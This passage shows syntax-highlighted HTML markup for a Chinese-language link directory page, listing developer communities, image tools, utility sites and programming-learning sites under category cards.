                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://github.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GitHub<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://coding.net/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Coding<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://juejin.im/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>掘金<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://gitee.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>码云<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.v2ex.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>V2EX<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.jianshu.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>简书<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.52pojie.cn/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>吾爱破解<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://segmentfault.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>思否<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cloud.tencent.com/developer/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>云+社区<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://36kr.com/newsflashes<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>36氪<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>图片处理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://tinypng.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>TingPNG<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.upyun.com/webp<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>又拍云Webp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.iconfont.cn/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>IconFont<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://fontawesome.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>AweSome<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://wallhaven.cc/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>超清壁纸<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.uupoop.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>在线PS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>实用 · 工具<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://mdnice.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Nice编辑器<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.processon.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>思维导图<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cli.im/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>二维码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.yinfans.me/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>音范思<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://my.openwrite.cn/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>OW分发<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://tool.liumingye.cn/avbv/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>BV转AV<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.guidgen.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>GUID在线生成<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://console.upyun.com/purge/purge_url/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>又拍云刷新网站<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>

                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>col s12 m6 l4 friend-div<span class="token punctuation">"</span></span> <span class="token attr-name">data-aos</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>zoom-in-up<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>card<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-tit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>编程 · 学习<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>jj-list-con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.oschina.net/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>开源中国<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://htmldog.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>HTML狗<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.icourse163.org/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>中国大学慕课<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://www.imooc.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>慕课网<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.wxapp-union.com/<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>link-3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>小程序<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
